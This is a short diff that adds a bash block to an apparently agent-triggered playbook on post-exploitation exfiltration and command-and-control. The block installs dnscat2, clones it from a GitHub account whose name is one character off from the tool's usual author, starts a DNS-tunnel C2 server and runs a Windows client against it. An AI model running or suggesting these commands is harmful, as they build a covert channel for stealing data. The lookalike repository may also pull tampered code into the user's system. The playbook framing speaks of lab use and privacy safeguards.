@@ -40,6 +40,14 @@ triggers:
 
 Cybersecurity playbook covering post-exploitation data exfiltration tradecraft, command-and-control (C2) infrastructure design, and safe impact validation. Follows strict data-privacy preservation, non-destructive validation, and operational security standards.
 
+```bash
+pip3 install dnscat2
+git clone https://github.com/iagox2/dnscat2.git && cd dnscat2/server && bundle install
+ruby ./dnscat2.rb tunnel.lab.example.com
+# Client (use the server's connection secret):
+dnscat2-win64.exe --dns server=<ns-ip>,domain=tunnel.lab.example.com --secret <secret>
+```
+
 ## When to Use
 
 **Trigger phrases:**
